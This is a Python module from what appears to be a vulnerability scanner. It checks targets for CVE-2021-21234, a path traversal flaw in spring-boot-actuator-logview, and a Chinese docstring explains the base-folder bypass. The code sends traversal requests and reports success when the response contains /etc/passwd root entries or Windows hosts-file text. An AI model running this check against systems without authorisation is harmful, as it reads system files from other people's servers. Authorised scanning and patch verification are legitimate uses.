#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
import re

def cve_2021_21234_scan(self, url):
    ''' spring-boot-actuator-logview文件包含漏洞
            <= 0.2.13
            虽然检查了文件名参数以防止目录遍历攻击(filename=../somefile 防御了攻击)
            但没有充分检查基本文件夹参数, 因此filename=somefile&base=../ 可以访问日志记录基目录之外的文件
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'FileRead'
    vul_info['vul_id'] = 'CVE-2021-21234'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers
    headers.update(vul_info['headers'])             # * 合并Headers

    for payload in self.cve_2021_21234_payloads:    # * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers, 
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    },
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None